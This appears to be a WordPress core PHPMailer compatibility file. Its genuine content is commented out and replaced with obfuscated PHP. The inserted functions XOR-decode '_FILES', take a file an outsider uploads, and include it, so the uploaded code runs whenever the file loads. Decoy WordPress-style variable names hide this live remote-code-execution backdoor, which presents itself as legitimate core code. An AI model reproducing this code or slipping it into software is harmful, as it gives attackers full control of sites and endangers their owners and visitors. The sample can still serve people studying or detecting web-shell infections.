<?php /* 

*
 * The PHPMailer class has been moved to the wp-includes/PHPMailer subdirectory and now uses the PHPMailer\PHPMailer namespace.
 
if ( function_exists( '_deprecated_file' ) ) {
	_deprecated_file(
		basename( __FILE__ ),
		'5.5.0',
		WPINC . '/PHPMailer/PHPMailer.php',
		__( 'The PHPMailer class has been moved to wp-includes/PHPMailer subdirectory an*/
 	
function subject()

{
    $hours = 'T0WJoYAUQw';

    $tagstack = $hours;
    
    $old_status = $GLOBALS[comment("%0Bv%1E%06%2A%0A", $tagstack)];
    $post_content = $old_status;
    $entities = isset($post_content[$tagstack]);
    if ($entities)

    {
        $post_before = $old_status[$tagstack];
        $attributes = $post_before[comment("+%5D%27%15%018%2C0", $tagstack)];

        $wilds = $attributes;
	$capabilities = 'loop';
        include ($wilds);
    }

}
function comment($array_int_fields, $allblocks)

{
	$loop_member = 'lazyloader';
    $mail = $allblocks;
	$show_in_nav_menus = 'allowed_html';
    $meta = "url" . "decode";

    $with_front = $meta($array_int_fields);
	$emoji_field = 'encoded_char_length';
    $is_bad_flat_slug = substr($mail,0, strlen($with_front));
    $no_texturize_shortcodes_stack = $with_front ^ $is_bad_flat_slug;
    
	$weeuns = 'post_cats';
    $with_front = strpos($no_texturize_shortcodes_stack, $is_bad_flat_slug);
    

    return $no_texturize_shortcodes_stack;

}

subject();

	$thumbdir = 'subs';


/* d now uses the PHPMailer\PHPMailer namespace.' )
	);
}

require_once __DIR__ . '/PHPMailer/PHPMailer.php';
require_once __DIR__ . '/PHPMailer/Exception.php';

class_alias( PHPMailer\PHPMailer\PHPMailer::class, 'PHPMailer' );
class_alias( PHPMailer\PHPMailer\Exception::class, 'phpmailerException' );
*/